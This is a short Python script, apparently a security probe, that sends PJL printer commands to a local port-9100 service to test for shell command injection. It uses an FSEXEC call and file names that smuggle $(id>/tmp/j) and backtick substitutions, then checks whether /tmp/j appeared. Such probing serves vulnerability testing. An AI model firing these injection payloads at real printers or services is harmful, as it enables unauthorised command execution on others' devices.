#!/usr/bin/env python3
import os
import socket

tests = [
    b"@PJL FSEXEC CMD=id\r\n",
    b"@PJL FSINIT\r\n",
    b'@PJL FSUPLOAD NAME="$(id>/tmp/j)"\r\nSIZE=1\r\na',
    b'@PJL FSQUERY NAME="`id`"\r\n',
]
for t in tests:
    s = socket.socket()
    s.settimeout(3)
    s.connect(("127.0.0.1", 9100))
    s.sendall(t)
    try:
        r = s.recv(1024)
    except socket.timeout:
        r = b"T"
    s.close()
    print(t[:60], r[:100])
print("tmpj", os.path.exists("/tmp/j"))